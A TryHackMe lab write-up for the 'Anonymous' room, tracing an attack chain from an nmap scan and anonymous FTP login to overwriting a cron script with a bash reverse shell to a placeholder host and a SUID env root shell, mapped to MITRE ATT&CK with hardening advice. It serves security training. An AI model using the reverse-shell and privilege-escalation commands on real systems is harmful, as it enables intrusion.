---
title: "TryHackMe Writeup: Anonymous"
date: 2025-11-28
description: "Adversarial assessment focused on network misconfigurations and persistence via Cron Jobs. Mapped via MITRE ATT&CK."
tags: ["tryhackme", "ftp", "cron", "privesc"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Executive Summary

Security analysis based on NIST SP 800-115. An exposed FTP service with write permissions allowed for Remote Code Execution (RCE) through system-scheduled tasks. Privilege escalation utilized native system binaries misconfigured with the SUID bit.

### Attack Chain (PTES Mapping)

#### 1. Reconnaissance
Identification of FTP (Anonymous login), SSH, and Samba services.
```bash
sudo nmap -Pn -sS -sV -T4 -p- 10.65.137.77
```
* **MITRE Technique:** [T1046](https://attack.mitre.org/techniques/T1046/) - Network Service Scanning.

#### 2. Exploitation
The FTP service allowed unauthenticated access and write permissions in the `/scripts/` directory.
```bash
ftp 10.65.137.77 # anonymous:anonymous
```
* **MITRE Technique:** [T1190](https://attack.mitre.org/techniques/T1190/) - Exploit Public-Facing Application.

#### 3. Persistence & Execution
The `clean.sh` script was overwritten to execute a reverse shell via a system Cron job.
```bash
echo -e "#!/bin/bash\nbash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'" > clean.sh
```
* **MITRE Technique:** [T1053.003](https://attack.mitre.org/techniques/T1053/003/) - Scheduled Task/Job: Cron.

#### 4. Post-Exploitation (Privilege Escalation)
Abuse of the `/usr/bin/env` binary with SUID permissions to obtain a root shell.
```bash
/usr/bin/env /bin/sh -p
```
* **MITRE Technique:** [T1548.001](https://attack.mitre.org/techniques/T1548/001/) - Abuse Elevation Control Mechanism: Setuid and Setgid.

### Recommendations (NIST SP 800-115)

* **Network Security:** Disable anonymous access on file transfer services.
* **Principle of Least Privilege:** Audit and remove SUID permissions from administrative binaries (`env`, `find`, etc.) that lack a legitimate operational requirement for privileged execution by standard users.